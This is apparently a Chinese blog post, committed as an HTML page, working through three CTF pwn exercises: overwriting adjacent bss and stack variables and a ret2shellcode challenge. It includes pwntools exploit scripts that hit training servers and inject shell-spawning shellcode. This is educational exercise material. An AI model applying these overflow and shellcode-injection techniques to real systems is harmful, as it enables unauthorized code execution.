@@ -1,0 +1,176 @@
+
+<!DOCTYPE html>
+<html lang="" class="loading">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>栈溢出之覆盖栈、bss段变量 - 赵丰年-全世界都知道我很低调</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="赵丰年,"> 
+    <meta name="description" content="写在前面之前说过栈溢出时，说过覆盖地址控制程序，主要会覆盖函数返回地址，覆盖栈上某个变量的内容或覆盖bss段某变量内容，之前ret2text就是覆盖的返回地址，今天刚好遇到两个题总结下后两个。
+he,"> 
+    <meta name="author" content="XIY"> 
+    <link rel="alternative" href="atom.xml" title="赵丰年-全世界都知道我很低调" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">赵丰年-全世界都知道我很低调</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="https://xiy-blogs.github.io"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">栈溢出之覆盖栈、bss段变量</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">栈溢出之覆盖栈、bss段变量</h1>
+        <div class="stuff">
+            <span>二月 28, 2020</span>
+            
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+
+        </div>
+        <div class="content markdown">
+            <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>之前说过栈溢出时，说过覆盖地址控制程序，主要会覆盖函数返回地址，覆盖栈上某个变量的内容或覆盖bss段某变量内容，之前ret2text就是覆盖的返回地址，今天刚好遇到两个题总结下后两个。</p>
+<h3 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h3><p>这里用的是攻防世界的hello_pwn<br>首先看一下开启了哪些保护措施<br><img src="https://i.loli.net/2020/02/28/FcbWDPH1ktMfNe7.png" alt="a1.png"><br>问题不大，扔IDA看一下<br><img src="https://i.loli.net/2020/02/28/j73KdJZ5gI82noT.png" alt="a2.png"><br><img src="https://i.loli.net/2020/02/28/GlN3bO5dYPiCDmg.png" alt="a3.png"><br>OK，这边看到看到如果满足该条件会进入sub_400686函数,得到flag<br>通过观察发现程序是通过read函数向unk_601068中写入数据的，ok，我们点击&amp;unk_601068看看<br><img src="https://i.loli.net/2020/02/28/GkQBbZl6IyxYchq.png" alt="a4.png"><br>发现unk_601068和dword_60106c的偏移量为4，它们位于bss段，可写入，我们可以通过填充4个a使其覆盖到dword_60106c再写入18533186401使条件满足，ok开始写exp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&#39;111.198.29.45&#39;,33172)</span><br><span class="line">payload &#x3D; &#39;a&#39;*4 + p64(1853186401)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born\"></a>when_did_you_born\</h3><p>依然先检查下保护措施<br><img src="https://i.loli.net/2020/02/28/8hPKcGYk9MdF456.png" alt="a6.png"><br>嘶，绿的这么多？不慌，扔IDA里再看看<br><img src="https://i.loli.net/2020/02/28/JHYUsVPIn5ziah4.png" alt="a5.png"><br>大概意思是，只要V5=1926就能拿到flag，但是第一次不能输入1926，也就是说不能在第一次输入时直接输入1926拿到flag,但是我们发现有一个gets函数给V4赋值，之后会判断V5,OK我们点进去看看<br><img src="https://i.loli.net/2020/02/28/stPMCTZe6IgWDYj.png" alt="a7.png"><br>我们发现，V4和V5的偏移是8，ok和上题一样，只需要从V4覆盖到V5然后写入1926即可，我们输入的字节并没有超过其请求的长度，所以canary保护在这里对我们没影响。确定了这些，我们可以写exp了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r &#x3D; remote(&#39;111.198.29.45&#39;,36182)</span><br><span class="line">r.recvuntil(&#39;Birth?&#39;)		&#x2F;&#x2F;等到接收到Birth</span><br><span class="line">r.sendline(&#39;1921&#39;)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*8 + p32(1926)</span><br><span class="line">r.recvuntil(&#39;Name?&#39;)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p>这类题大多是要输入数据使其满足条件，但却无法直接向其输入，而往往会有另一个输入点可以利用</p>
+<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>最后简单聊聊<a href="https://raw.githubusercontent.com/ctf-wiki/ctf-challenges/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode" target="_blank" rel="noopener">ret2shellcode</a><br>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。<br>OK，看题<br><img src="https://i.loli.net/2020/02/28/aV8oNdREpjTbzLM.png" alt="屏幕截图 2020-02-28 15.17.11.png"><br>这个题真友好，什么保护也没开<br>扔IDA<br><img src="https://i.loli.net/2020/02/28/g1EqRYFwuxtC6Tm.png" alt="a8.png"><br>存在一个栈溢出，运行程序输入大量字符验证一下<br><img src="https://i.loli.net/2020/02/28/J7LznPIvF8t3gCU.png" alt="a9.png"><br>果然报段错误了，存在栈溢出漏洞<br>继续看IDA<br><img src="https://i.loli.net/2020/02/28/YRg7wC6XLIQm4Wy.png" alt="a10.png"><br><img src="https://i.loli.net/2020/02/28/grUI76axCtQNMv9.png" alt="a11.png"><br><img src="https://i.loli.net/2020/02/28/pO7heIZFcHzJxno.png" alt="a12.png"><br>一个好消息，一个坏消息，通过shift+f12查看字符串并没有发现’/bin/sh’<br>但是，我们发现buf2在bss段，可以写入数据，而且此bss段可执行<br>我们可以先写入shellcode，然后溢出覆盖到该地址执行shellcode,ok,开始确定溢出偏移，写exp<br><img src="https://i.loli.net/2020/02/28/n7GLkmUHObZ28Ja.png" alt="a13.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">r &#x3D; process(&#39;.&#x2F;ret2shellcode&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">buf2 &#x3D; 0x804a080</span><br><span class="line"></span><br><span class="line">r.sendline(shellcode.ljust(112, &#39;a&#39;) + p32(buf2))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<p><a href="https://www.runoob.com/python/att-string-ljust.html" target="_blank" rel="noopener">关于.ljust()</a></p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src="https://link.hhtjim.com/163/569214250.mp3">
+            </audio>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='9795acb241b5abfffb0a'
+        data-cs='660e7056618084a8a8046e8e2e9e78787cdb23cf'
+        data-r='XIY-blogs.github.io'
+        data-o='XIY-blogs'
+        data-a='XIY-blogs'
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
